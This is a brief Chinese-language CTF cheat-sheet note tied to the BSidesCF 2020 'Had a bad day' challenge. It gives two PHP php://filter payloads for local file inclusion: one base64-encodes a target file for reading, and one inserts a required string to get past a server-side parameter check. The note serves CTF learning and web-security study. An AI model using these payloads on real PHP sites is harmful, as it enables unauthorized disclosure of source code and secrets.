```php
php://filter/read=convert.base64-encode/resource=<filename>
```
另外，如果服务端要求参数中包含特定字符串时，可以利用下面的trick
```php
php://filter/read=convert.base64-encode/write=<required_string>/resource=<filename>
```
参考[[[BSidesCF 2020]Had a bad day]]

#Web #PHP #伪协议 #LFI #编码 